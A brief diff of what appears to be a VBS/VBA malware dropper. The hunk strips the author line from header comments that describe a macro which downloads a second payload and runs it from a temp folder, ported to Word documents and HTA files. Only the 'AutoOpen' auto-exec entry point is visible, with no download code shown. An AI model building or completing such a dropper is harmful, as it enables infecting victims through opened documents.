@@ -1,8 +1,7 @@
-'author: mp
-'comment: VBS that can easily be ported to an HTA file or a word doc
-'         this is really just a simple dropper that wget's another 
-'         payload and execs it from a temp dir. tested on word 2010
-'         and HTA file with IE 11 on Windows 8.1
+'VBS that can easily be ported to an HTA file or a word doc
+'this is really just a simple dropper that wget's another 
+'payload and execs it from a temp dir. tested on word 2010
+'and HTA file with IE 11 on Windows 8.1
 
 Sub AutoOpen()
     Dim objshell As Object
